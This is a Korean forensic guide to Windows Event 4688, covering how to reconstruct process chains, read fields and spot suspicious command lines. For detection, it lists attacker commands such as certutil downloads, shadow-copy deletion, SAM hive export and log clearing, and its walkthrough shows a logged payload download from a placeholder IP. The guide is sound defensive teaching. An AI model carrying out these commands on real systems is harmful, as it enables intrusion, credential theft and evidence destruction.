---
id: FOR-0088
title: "Event ID 4688 프로세스 생성: CommandLine 과 부모-자식 체인 재구성"
slug: "event-4688-process-creation"
category: "Event Log"
type: "guide"
difficulty: "intermediate"
priority: "critical"
platform: [windows]
artifact: ["Security.evtx", "4688", "CommandLine", "프로세스 생성 감사", "Detailed Tracking", "EVTX"]
file_paths: ["C:\\Windows\\System32\\winevt\\Logs\\Security.evtx", "%SystemRoot%\\System32\\winevt\\Logs"]
registry_paths: ["HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\\Audit"]
event_ids: ["4688", "4689"]
protocols: []
tools: ["EvtxECmd", "Event Viewer", "PowerShell", "Timeline Explorer", "wevtutil"]
commands: ["Get-WinEvent -FilterHashtable @{Path='Security.evtx';Id=4688}", "EvtxECmd.exe -f Security.evtx --csv . --csvf sec.csv", "auditpol /get /subcategory:\"Process Creation\"", "wevtutil qe Security.evtx /q:\"*[System[(EventID=4688)]]\" /f:text"]
regex_patterns: ["-e(nc|ncodedcommand)?\\s+[A-Za-z0-9+/=]{24,}", "%%193[678]", "0x[0-9a-f]{2,4}"]
wireshark_filters: []
tshark_fields: []
log_fields: ["SubjectUserSid", "SubjectUserName", "SubjectLogonId", "NewProcessId", "NewProcessName", "TokenElevationType", "ProcessId", "ParentProcessName", "CommandLine", "MandatoryLabel"]
file_formats: ["evtx"]
primary_terms: ["4688", "프로세스 생성", "명령행 로그", "CommandLine 이벤트", "명령어 흔적"]
keywords: ["4688", "프로세스 생성", "process creation", "CommandLine", "명령행", "ParentProcessName", "부모 프로세스", "TokenElevationType", "NewProcessName", "Security.evtx", "4689", "Sysmon 1"]
aliases: ["4688", "무슨 명령을 실행했나", "명령행 로그", "실행한 프로그램 기록", "부모 프로세스 찾기", "powershell 실행 흔적", "commandline 안 나온다"]
symptom_keywords: ["어떤 명령을 실행했는지 알고 싶다", "4688에 명령행이 안 보인다", "부모 프로세스를 모르겠다", "PID가 16진수로 나온다", "누가 powershell을 실행했나", "실행 체인을 재구성하고 싶다"]
related: ["FOR-0083", "FOR-0097", "FOR-0099", "FOR-0105"]
source_ids: ["SRC-021", "SRC-022", "SRC-086", "SRC-024"]
last_verified: "2026-09-10"
status: "verified"
---

## 한 줄 결론

4688은 생성된 프로세스마다 한 건씩 기록되며, `NewProcessName`(무엇이) · `ProcessId`(누가 낳았나) · `CommandLine`(어떤 인자로)의 세 필드로 실행 체인을 복원한다 — 단 **`CommandLine` 은 별도 정책이 켜져 있을 때만 기록된다.**

## 어떤 문제에서 필요한가

- "공격자가 실행한 명령은 무엇인가" (인코딩된 PowerShell, 다운로더, 파일 삭제)
- "이 악성코드는 무엇이 실행시켰나" (문서 매크로 → cmd → powershell 체인)
- "관리자 권한으로 실행되었나" (`TokenElevationType`)
- "로그온 세션 안에서 무슨 일이 벌어졌나" ([FOR-0083](./event-4624-logon.html)에서 얻은 `TargetLogonId` 를 `SubjectLogonId` 로 이어붙인다)
- "C2 주소가 명령행에 남아 있나"

4688은 Security 채널에서 건수가 가장 많은 이벤트다. 감사가 켜진 워크스테이션이면 하루 수만 건이 나온다. **경로 필터 없이 열면 반드시 실패한다.**

## 문제에서 처음 볼 단서

1. 지문에 "명령", "실행", "인자", "무엇을 다운로드" → 4688 확정
2. 첨부에 `Security.evtx` 가 있고 4624 로 세션을 잡았다 → 같은 `SubjectLogonId` 의 4688
3. 메모리 덤프의 `windows.cmdline` 에서 이미 명령행을 봤다 → 4688 로 **시각**을 확정
4. Base64 로 보이는 긴 문자열이 문제에 등장 → `CommandLine` 안의 `-enc` 인자
5. 4688 이 아예 없다 → 감사 미설정 또는 1102(로그 삭제). Sysmon 채널로 우회

## 30초 절차

```powershell
Get-WinEvent -FilterHashtable @{Path='C:\case\Security.evtx';Id=4688} | Format-List Message
```

건수를 먼저 세고, 명령행이 실제로 기록되었는지부터 확인한다.

```powershell
# 1) 4688 총 건수
(Get-WinEvent -FilterHashtable @{Path='C:\case\Security.evtx';Id=4688}).Count

# 2) 핵심 필드만 평면화 (CommandLine 이 비어 있으면 정책이 꺼져 있었다는 뜻)
Get-WinEvent -FilterHashtable @{Path='C:\case\Security.evtx';Id=4688} |
  ForEach-Object {
    $x = [xml]$_.ToXml()
    $d = @{}; $x.Event.EventData.Data | ForEach-Object { $d[$_.Name] = $_.'#text' }
    [pscustomobject]@{
      TimeUTC = $_.TimeCreated.ToUniversalTime().ToString('yyyy-MM-dd HH:mm:ss')
      User    = $d['SubjectUserName']
      LogonId = $d['SubjectLogonId']
      NewPid  = $d['NewProcessId']
      NewProc = $d['NewProcessName']
      PPid    = $d['ProcessId']
      Parent  = $d['ParentProcessName']
      Elev    = $d['TokenElevationType']
      Cmd     = $d['CommandLine']
    }
  } | Export-Csv 'C:\case\out\4688.csv' -NoTypeInformation -Encoding UTF8
```

CSV 로 뽑아 두면 이후 모든 필터가 `Import-Csv` 한 줄로 끝난다.

## 상세 절차

### 1단계 — CommandLine 이 기록되는 조건을 먼저 확정한다

4688 자체는 감사 정책 `Detailed Tracking > Audit Process Creation` 으로 켜진다. **명령행은 여기에 포함되지 않는다.** 별도의 정책이 하나 더 필요하다.

| 항목 | 값 |
| --- | --- |
| 4688 자체를 켜는 정책 | `Audit Process Creation` (Detailed Tracking 범주) |
| 명령행을 포함시키는 정책 | `Include command line in process creation events` (Administrative Templates > System > Audit Process Creation) |
| 그 정책의 레지스트리 위치 | `HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\Audit` |
| 값 이름 | `ProcessCreationIncludeCmdLine_Enabled` (DWORD, `1` 이면 활성) |
| 꺼져 있을 때의 4688 | `CommandLine` 필드가 비거나 아예 없다. `NewProcessName` 경로만 남는다 |

즉 **`CommandLine` 이 비어 있는 4688 을 보고 "인자 없이 실행됐다"고 판정하면 오답이다.** 그것은 정책이 꺼져 있었다는 뜻일 뿐이다. 실제 이미지를 다루면 SYSTEM hive 의 위 키를 확인해 어느 쪽인지 먼저 가른다.

```powershell
# 라이브 시스템에서 두 정책의 상태 확인
auditpol /get /subcategory:"Process Creation"
Get-ItemProperty 'HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\Audit' |
  Select-Object ProcessCreationIncludeCmdLine_Enabled
```

### 2단계 — 노이즈를 경로로 잘라낸다

4688 은 부팅·업데이트·백그라운드 작업으로 끊임없이 발생한다.

| 버릴 대상 | 판별 방법 |
| --- | --- |
| 시스템 유지관리 | `NewProcessName` 이 `\Windows\System32\svchost.exe`, `taskhostw.exe`, `SearchProtocolHost.exe`, `MpCmdRun.exe` |
| 업데이트 | 경로에 `\Windows\SoftwareDistribution\`, `TrustedInstaller.exe`, `TiWorker.exe` |
| 컴퓨터 계정이 주체 | `SubjectUserName` 이 `$` 로 끝남 |
| SYSTEM 세션 | `SubjectLogonId` = `0x3e7` (단, 서비스가 낳은 악성 프로세스는 여기 숨는다 — 완전히 버리지 말고 따로 본다) |

```powershell
Import-Csv 'C:\case\out\4688.csv' |
  Where-Object {
    $_.NewProc -notmatch 'svchost\.exe|taskhostw\.exe|SearchProtocolHost|MpCmdRun|TiWorker|conhost\.exe' -and
    $_.User -notmatch '\$$'
  } | Sort-Object TimeUTC | Format-Table -AutoSize
```

### 3단계 — 정상 부모-자식 기준선과 대조한다

**이 표가 4688 분석의 절반이다.** 실행 파일 이름만 보면 아무것도 이상하지 않다. 이상한 것은 **누가 그것을 낳았는가**다.

| 자식 프로세스 | 정상 부모 | 정상 경로 | 어긋나면 |
| --- | --- | --- | --- |
| `cmd.exe` | `explorer.exe`, `services.exe`, 스크립트 호스트 | `\Windows\System32` | Office 앱이 부모면 매크로 |
| `powershell.exe` | `explorer.exe`, `cmd.exe`, `services.exe` | `\System32\WindowsPowerShell\v1.0` | `winword.exe`/`excel.exe`/`outlook.exe` 가 부모면 **문서 실행** |
| `svchost.exe` | `services.exe` | `\Windows\System32` | 다른 부모면 **위장** |
| `lsass.exe` | `wininit.exe` | `\Windows\System32` | 2개 이상이거나 부모가 다르면 자격증명 탈취 위장 |
| `rundll32.exe` | 실행 주체 애플리케이션 | `\Windows\System32` | 인자가 없거나 `javascript:` 면 **강한 의심** |
| `regsvr32.exe` | `explorer.exe`, 설치 프로그램 | `\Windows\System32` | `/i:http` 인자는 프록시 실행 |
| `wscript.exe` / `cscript.exe` | `explorer.exe` | `\Windows\System32` | 메일 첨부 → 스크립트 실행 경로 |
| `whoami.exe` / `net.exe` / `ipconfig.exe` | `cmd.exe`, `powershell.exe` | `\Windows\System32` | 짧은 시간에 연달아 나오면 **정찰(discovery)** |
| 임의 exe | `explorer.exe` | `\Users\<user>\AppData\Local\Temp` | 사용자 임시 폴더 실행은 언제나 의심 |

메모리 이미지가 함께 주어졌으면 [FOR-0214](./volatility-pslist.html)의 부모-자식 기준선 표와 같은 논리로 교차확인한다. 4688 은 **종료된 프로세스까지 남는다**는 점에서 메모리보다 유리하다.

### 4단계 — PID 로 체인을 잇는다

`NewProcessId` 와 `ProcessId` 는 **16진수 문자열**로 기록된다. `0x1274` 는 십진수 4724다. Volatility·Task Manager 는 십진수로 보여주므로 그대로 비교하면 아무것도 매칭되지 않는다.

```powershell
# 16진수 -> 십진수
[Convert]::ToInt32('1274', 16)      # 4724

# 십진수 -> 16진수 (4688 검색용)
'0x{0:x}' -f 4724                   # 0x1274
```

체인 재구성 절차:

1. 관심 프로세스의 4688 을 찾아 `NewProcessId` 를 적는다 (예: `0x1274`)
2. 같은 레코드의 `ProcessId`(부모 PID, 예: `0x9ac`)를 적는다
3. `NewProcessId` = `0x9ac` 인 4688 을 찾는다 → 부모의 생성 이벤트
4. 부모가 없어질 때까지 2~3을 반복한다 → 루트가 `explorer.exe` 인지 `services.exe` 인지가 곧 침입 경로
5. 반대 방향으로, `ProcessId` = `0x1274` 인 4688 을 모으면 그 프로세스가 낳은 자식 전부

```powershell
$target = '0x1274'
$all = Import-Csv 'C:\case\out\4688.csv'

# 부모 추적 (위로)
$all | Where-Object { $_.NewPid -eq $target } | Select-Object TimeUTC, NewProc, PPid, Parent

# 자식 추적 (아래로)
$all | Where-Object { $_.PPid -eq $target } | Select-Object TimeUTC, NewProc, Cmd
```

**PID 는 재사용된다.** 부팅이 길어지면 같은 `0x1274` 가 여러 프로세스에 배정된다. 그래서 PID 매칭은 반드시 **시각 창(부모 생성 이후 ~ 자식 생성 시점)** 안에서만 유효하다고 보고, `ParentProcessName` 문자열과 함께 검증한다.

### 5단계 — 의심 명령행 패턴을 정규식으로 긁는다

```powershell
$susp = @(
  'powershell.*-e(nc|ncodedcommand)',   # Base64 인코딩 명령
  'powershell.*-w(indowstyle)?\s+hidden',
  'powershell.*-nop',                   # NoProfile
  'powershell.*(IEX|Invoke-Expression|DownloadString|FromBase64String)',
  'certutil.*(-urlcache|-decode|-encode)',
  'bitsadmin.*(/transfer|/addfile)',
  'rundll32.*javascript:',
  'mshta.*(http|javascript:|vbscript:)',
  'wmic.*process.*call.*create',
  'schtasks.*/create',
  'sc(\.exe)?\s+create',
  'vssadmin.*delete.*shadows',
  'wbadmin.*delete',
  'bcdedit.*(recoveryenabled|bootstatuspolicy)',
  'net(\.exe)?\s+user.*/add',
  'net(\.exe)?\s+localgroup.*administrators.*/add',
  'reg(\.exe)?\s+(add|save).*\\(SAM|SYSTEM|SECURITY)',
  'wevtutil.*\bcl\b',
  'nltest|whoami\s+/priv|net\s+group\s+"domain admins"'
) -join '|'

Import-Csv 'C:\case\out\4688.csv' |
  Where-Object { $_.Cmd -match $susp } |
  Select-Object TimeUTC, User, NewProc, Cmd | Format-List
```

정규식은 **작은따옴표**로 쓴다. 큰따옴표 안의 `$` 는 PowerShell 이 변수로 확장한다.

| 패턴 | 무엇을 뜻하는가 | 다음 확인 |
| --- | --- | --- |
| `powershell -enc <Base64>` | 난독화된 스크립트 실행 | 4104 스크립트 블록 로그에서 평문 |
| `-w hidden` / `-nop` | 창 숨김 + 프로필 무시. 대화형 사용이 아니다 | 부모 프로세스 |
| `certutil -urlcache -split -f <URL>` | LOLBin 다운로더 | 다운로드 경로의 `$MFT` 생성 시각 |
| `bitsadmin /transfer` | BITS 다운로더 | BITS-Client 채널 |
| `rundll32 javascript:...` | 프록시 실행, 파일 없는 실행 | 명령행 전체 문자열 |
| `mshta http://...` | HTA 원격 실행 | 브라우저·메일 흔적 |
| `wmic process call create` | 로컬/원격 프로세스 생성 | 대상 호스트의 4624 Type 3 |
| `schtasks /create` | 예약 작업 지속성 | `\Windows\System32\Tasks` XML, 4698 |
| `sc create` | 서비스 지속성 | 7045 / 4697 |
| `vssadmin delete shadows` | 섀도 복사본 파괴 (랜섬웨어) | 그 직후 대량 파일 변경 |
| `net user <name> /add` | 계정 생성 | 4720, SAM hive |
| `reg save HKLM\SAM` | 자격증명 hive 반출 | 생성된 파일 경로 |
| `wevtutil cl` | 로그 삭제 | 1102 |

## 출력 필드 해석

원본 EventData 의 실제 XML 필드 이름이다. Event Viewer 의 한글 표시명이 아니라 이 이름으로 검색해야 정확하다.

| 필드 | 의미 | 읽는 법 |
| --- | --- | --- |
| `SubjectUserSid` | 프로세스를 만든 주체의 SID | `S-1-5-18` = SYSTEM |
| `SubjectUserName` | 주체 계정 이름 | `$` 로 끝나면 컴퓨터 계정 |
| `SubjectDomainName` | 주체 도메인 | 로컬이면 컴퓨터 이름 |
| `SubjectLogonId` | **로그온 세션 ID (16진수)** | 4624 의 `TargetLogonId` 와 이어붙이는 키 |
| `NewProcessId` | 생성된 프로세스의 PID (**16진수**) | `0x1274` = 4724 |
| `NewProcessName` | 생성된 실행 파일의 **전체 경로** | 경로가 곧 판단 근거. `\Temp\`, `\AppData\` 는 의심 |
| `TokenElevationType` | 토큰 승격 종류 | 아래 표 |
| `ProcessId` | **부모 프로세스의 PID (16진수)** | 이름이 헷갈린다. 이 값이 부모다 |
| `ParentProcessName` | 부모 실행 파일의 전체 경로 | Windows 10 이상에서 채워진다 |
| `CommandLine` | 실행 명령행 전체 | 별도 정책 필요. 없으면 빈 값 |
| `MandatoryLabel` | 프로세스 무결성 수준 SID | 아래 표 |
| `TargetUserSid` / `TargetUserName` / `TargetDomainName` / `TargetLogonId` | 다른 계정으로 실행된 경우의 대상 계정 | 보통 `S-1-0-0` / `-` / `0x0` |

### TokenElevationType

값은 `%%` 로 시작하는 메시지 테이블 참조자로 저장된다. Event Viewer 는 이를 문자열로 바꿔 보여주지만 **원본 XML 과 CSV 에는 숫자 코드가 그대로 남는다.**

| 값 | 이름 | 의미 |
| --- | --- | --- |
| `%%1936` | `TokenElevationTypeDefault` | UAC 가 꺼져 있거나, 승격 개념이 없는 계정(예: 기본 Administrator, 표준 사용자)의 기본 토큰 |
| `%%1937` | `TokenElevationTypeFull` | **관리자 권한 전체 토큰.** 승격 실행("관리자 권한으로 실행") |
| `%%1938` | `TokenElevationTypeLimited` | UAC 로 축소된 제한 토큰. 일반 실행 |

`%%1937` 인 4688 은 그 자체로 우선 조사 대상이다. 여기에 `NewProcessName` 이 `cmd.exe` / `powershell.exe` 면 승격된 셸이다.

### MandatoryLabel (무결성 수준)

| SID | 수준 | 의미 |
| --- | --- | --- |
| `S-1-16-4096` | Low | 브라우저 샌드박스 등 |
| `S-1-16-8192` | Medium | 일반 사용자 프로세스 |
| `S-1-16-12288` | High | 승격된 관리자 프로세스 |
| `S-1-16-16384` | System | SYSTEM 프로세스 |

`MandatoryLabel` 이 `S-1-16-12288` 이면서 부모가 사용자 프로세스면 승격 지점이다.

### 원본 XML 예시

```text
<EventData>
  <Data Name="SubjectUserSid">S-1-5-21-1004336348-1177238915-682003330-1103</Data>
  <Data Name="SubjectUserName">svc_backup</Data>
  <Data Name="SubjectDomainName">WIN10-DEV</Data>
  <Data Name="SubjectLogonId">0x1a2b3c</Data>
  <Data Name="NewProcessId">0x1274</Data>
  <Data Name="NewProcessName">C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe</Data>
  <Data Name="TokenElevationType">%%1937</Data>
  <Data Name="ProcessId">0x9ac</Data>
  <Data Name="CommandLine">powershell.exe -nop -w hidden -enc SQBFAFgAIAAoAE4A...</Data>
  <Data Name="ParentProcessName">C:\Windows\System32\cmd.exe</Data>
  <Data Name="MandatoryLabel">S-1-16-12288</Data>
</EventData>
```

`TimeCreated SystemTime` 은 **UTC** 로 저장된다. Event Viewer 는 로컬 시간대로 변환해 표시하므로 두 화면의 숫자가 다르다. **답이 KST 면 UTC + 9시간.** 시스템의 실제 시간대는 SYSTEM hive 의 `TimeZoneInformation` 으로 확인한다([FOR-0054](./system-timezone.html)).

## pivot: 다음에 볼 artifact

| 4688 에서 얻은 것 | 다음 목표 | 확인할 것 |
| --- | --- | --- |
| `SubjectLogonId` | 4624 ([FOR-0083](./event-4624-logon.html)) | 그 세션이 누구·어디서 시작됐는지 |
| `SubjectLogonId` | 4672 | 그 세션이 관리자 권한이었는지 |
| `CommandLine` 의 `-enc` Base64 | PowerShell 4104 (Operational 채널) | 디코딩된 스크립트 본문 |
| `NewProcessName` 경로 | `$MFT` ([FOR-0021](./mft-basics.html)) | 그 실행 파일이 언제 생성·삭제됐는지 |
| `NewProcessName` 파일명 | Prefetch, Amcache, AppCompatCache | 실행 횟수와 최초 실행 시각 |
| `CommandLine` 안의 URL/IP | pcap `ip.addr == <IP>` | 실제 통신 내용 |
| `sc create` / `schtasks /create` | 7045, 4697, Tasks XML | 지속성 등록 여부 |
| `net user /add` | 4720, SAM hive | 생성된 계정과 RID |
| `ProcessId`(부모) | 같은 파일의 다른 4688 | 체인 루트까지 역추적 |
| `NewProcessId` | 4689 (프로세스 종료) | 프로세스 수명 = 활동 구간 |

## 흔한 함정

- **`CommandLine` 이 비었는데 "인자 없이 실행"으로 판정한다.** 별도 정책(`ProcessCreationIncludeCmdLine_Enabled`)이 꺼져 있으면 필드 자체가 비거나 없다. 정책 상태를 먼저 확인하고, 꺼져 있었다면 명령행은 Sysmon 1 · PowerShell 4104 · Prefetch 로 우회한다.
- **`ProcessId` 를 생성된 프로세스의 PID 로 읽는다.** 4688 에서 생성된 쪽은 `NewProcessId` 다. `ProcessId` 는 **부모**다. 이름 때문에 가장 자주 틀리는 지점이다.
- **16진수 PID 를 십진수로 비교한다.** `0x1274` 를 "1274" 로 검색하면 아무것도 안 나온다. 반드시 변환한 뒤 대조한다.
- **PID 재사용을 무시한다.** 부팅이 오래 지속되면 같은 PID 가 여러 프로세스에 배정된다. 시각 창과 `ParentProcessName` 문자열을 함께 검증한다.
- **`ParentProcessName` 이 없는 구버전 로그에서 부모를 포기한다.** 이 필드는 Windows 10 이상에서 채워진다. 없으면 `ProcessId` 값으로 부모의 4688 을 직접 찾는다.
- **실행 파일 이름만 보고 정상 판정한다.** `svchost.exe` 는 이름이 정상이어도 부모가 `services.exe` 가 아니면 위장이다. 판단은 항상 (경로 + 부모 + 명령행) 조합으로 한다.
- **`%%1937` 을 문자열로 렌더된 값으로만 찾는다.** 원본 XML·EvtxECmd CSV 에는 `%%1937` 이 그대로 들어 있다. `"Full"` 로 검색하면 놓친다.
- **UTC/로컬 혼동.** EVTX 내부 `SystemTime` 은 UTC 다. Event Viewer 표시값과 EvtxECmd CSV 값이 다르게 보이는 이유가 이것이다. KST 답은 +9시간.
- **4688 이 없으면 실행이 없었다고 결론 낸다.** 감사 미설정, 1102 로그 삭제, 로그 롤오버(파일 크기 초과로 오래된 레코드 덮어쓰기) 세 가능성을 먼저 배제한다.
- **Temp 경로 실행을 전부 악성으로 몬다.** 설치 프로그램은 정상적으로 Temp 에서 실행된다. 서명·파일명·부모를 함께 본다.

## 교차검증

```powershell
# 1) 4688 — 대상 명령행 확정
Get-WinEvent -FilterHashtable @{Path='C:\case\Security.evtx';Id=4688} |
  Where-Object { $_.Message -match 'certutil|-enc|mshta' }

# 2) 4689 — 같은 PID 의 종료 시각 (프로세스 수명)
Get-WinEvent -FilterHashtable @{Path='C:\case\Security.evtx';Id=4689} |
  Where-Object { $_.Message -match '0x1274' }

# 3) 4624 — 그 SubjectLogonId 세션의 출처
Get-WinEvent -FilterHashtable @{Path='C:\case\Security.evtx';Id=4624} |
  Where-Object { $_.Message -match '0x1a2b3c' }

# 4) PowerShell 4104 — -enc 로 넘긴 스크립트의 평문
Get-WinEvent -FilterHashtable @{
  Path='C:\case\Microsoft-Windows-PowerShell%4Operational.evtx'; Id=4104
} | Select-Object -ExpandProperty Message

# 5) Sysmon 1 — 해시와 부모 명령행까지
Get-WinEvent -FilterHashtable @{
  Path='C:\case\Microsoft-Windows-Sysmon%4Operational.evtx'; Id=1
}
```

### 4688 과 Sysmon Event 1 비교

같은 "프로세스 생성"이지만 정보량이 다르다. 둘 다 있으면 **Sysmon 1 을 먼저 본다.**

| 항목 | Security 4688 | Sysmon Event 1 |
| --- | --- | --- |
| 활성 조건 | 감사 정책 필요 | Sysmon 설치 + 구성 필요 |
| 명령행 | **별도 정책이 켜져야 함** | 항상 `CommandLine` 으로 제공 |
| 부모 경로 | `ParentProcessName` (Win10+) | 항상 `ParentImage` |
| 부모 명령행 | 없음 | **`ParentCommandLine` 제공** |
| 실행 파일 해시 | 없음 | **`Hashes` (MD5/SHA256 등, 구성에 따름)** |
| 서명/제품 정보 | 없음 | `Company`, `Product`, `OriginalFileName` |
| 작업 디렉터리 | 없음 | `CurrentDirectory` |
| 프로세스 식별자 | PID(16진수). 재사용 문제 있음 | **`ProcessGuid`로 재사용 문제 없음** |
| 무결성 수준 | `MandatoryLabel` (SID) | `IntegrityLevel` (문자열) |
| 세션 연결 | `SubjectLogonId` | `LogonId`, `LogonGuid` |
| 채널 | `Security` | `Microsoft-Windows-Sysmon/Operational` |
| 노이즈 | 매우 많음 | 구성 파일로 필터 가능 |

핵심 차이는 **해시 · 부모 명령행 · ProcessGuid** 세 가지다. 4688 만 있을 때는 이 셋을 다른 artifact 로 메워야 한다(해시는 파일 자체에서, 부모 명령행은 부모의 4688 에서, PID 재사용은 시각 창으로).

## mini walkthrough

```text
문제:
"2026-03-14 침해 사고입니다. 공격자가 내려받은 페이로드의 URL 을 구하세요.
 첨부: Security.evtx (61,904 events)"

1. 첫 시도 (실패):
   Get-WinEvent ... Id=4688 | Where-Object { $_.Message -match 'http' }
   -> 0건.
   "다운로드가 없었다"고 결론 낼 뻔했다.

2. 왜 틀렸나:
   4688 을 한 건 열어 보니 CommandLine 필드 자체가 없었다.
   즉 'Include command line in process creation events' 정책이 꺼진 상태.
   경로만 남고 인자는 기록되지 않았다.
   -> 4688 의 CommandLine 으로 URL 을 찾는 접근은 이 이미지에서 성립하지 않는다.

3. 방향 전환 — 경로만으로 무엇이 실행됐는지 본다:
   Import-Csv 4688.csv | Where-Object { $_.User -notmatch '\$$' } |
     Group-Object NewProc | Sort-Object Count | Select-Object Count, Name

   Count  Name
   ...
   3      C:\Windows\System32\certutil.exe
   2      C:\Windows\System32\mshta.exe
   1      C:\Users\jhkim\AppData\Local\Temp\svc_update.exe

   certutil 과 mshta 가 사용자 세션에서 실행됐다. 정상 워크스테이션 사용 패턴이 아니다.

4. 체인 재구성 (PID):
   certutil 의 4688: NewProcessId=0x1274, ProcessId=0x9ac
   NewProcessId=0x9ac 인 4688 -> C:\Windows\System32\cmd.exe (ProcessId=0x5f8)
   NewProcessId=0x5f8 인 4688 -> C:\Program Files\Microsoft Office\root\Office16\WINWORD.EXE

   WINWORD -> cmd -> certutil.
   문서 매크로가 출발점이라는 것이 확정됐다.

5. URL 은 어디서? -> 명령행이 없는 구간을 다른 로그로 메운다:
   같은 시각대의 PowerShell Operational 4104 를 열었다.
   -> Invoke-WebRequest -Uri 'http://198.51.100.5/u/pl.dat' -OutFile "$env:TEMP\svc_update.exe"

6. 교차검증:
   4688 의 Temp\svc_update.exe 실행 시각 = 07:24:55Z
   4104 의 다운로드 시각        = 07:24:31Z
   -> 24초 차이. 다운로드 직후 실행. 일치.

7. 시간대 확정:
   EVTX SystemTime 은 UTC. 07:24:31Z -> KST 16:24:31.
   문제에서 KST 를 요구하면 +9 를 적용해 답한다.

정답: http://198.51.100.5/u/pl.dat
```

1단계의 실패가 이 글의 핵심이다. **4688 에서 명령행이 안 나오는 것은 "없었다"가 아니라 "기록되지 않았다"** 이고, 그때는 (a) 경로와 부모 체인으로 무엇이 실행됐는지를 세우고 (b) 인자는 4104·Sysmon 1·Prefetch·브라우저 흔적으로 메운다.

## 막혔을 때 다음 체크

1. `CommandLine` 필드가 존재하는지 원본 XML 을 한 건 열어 확인했는가 — 여기서 전략이 갈린다
2. `ProcessId` 를 부모로, `NewProcessId` 를 자식으로 올바르게 읽었는가
3. 16진수 PID 를 십진수로 변환해 비교했는가
4. 부모 체인을 루트(`explorer.exe` / `services.exe` / Office 앱)까지 올라갔는가
5. `TokenElevationType` = `%%1937` 인 레코드를 따로 뽑았는가
6. `NewProcessName` 경로가 `\Temp\` · `\AppData\` · `\ProgramData\` · `\Users\Public\` 인 건을 훑었는가
7. 의심 명령행 정규식(`-enc`, `certutil`, `mshta`, `rundll32 javascript:`, `vssadmin delete`)을 전부 돌렸는가
8. 4688 이 비어 있다면 → Sysmon 1, PowerShell 4104/4103, Prefetch, Amcache 로 대체
9. 4688 구간이 뚝 끊겼다면 → 1102(로그 삭제), 4719(감사 정책 변경), 로그 최대 크기 초과 롤오버 확인
10. 답을 UTC 로 낼지 KST(+9)로 낼지 지문을 다시 읽었는가

## 출처

- SRC-021 — Microsoft Learn, Event 4688 (A new process has been created): EventData 필드 정의, `TokenElevationType` 의 `%%1936`/`%%1937`/`%%1938` 대응, `ProcessId` 가 부모 PID 라는 점
- SRC-022 — Microsoft Learn, Advanced security audit policy settings: `Audit Process Creation` 하위 범주와 4688/4689 의 활성 조건
- SRC-086 — MITRE ATT&CK Enterprise Techniques: LOLBin 프록시 실행·정찰·지속성·섀도 복사본 삭제 등 의심 명령행 패턴의 근거
- `ProcessCreationIncludeCmdLine_Enabled` 값 이름과 그룹 정책 메뉴 경로는 Windows 버전에 따라 표기가 다를 수 있으므로 실제 시스템에서 확인할 것
- Sysmon Event 1 의 필드 구성은 Sysmon 버전과 구성 파일에 따라 달라진다. 해시 알고리즘은 구성의 `HashAlgorithms` 설정에 의존하므로 실제 이벤트에서 확인할 것
</content>
</invoke>
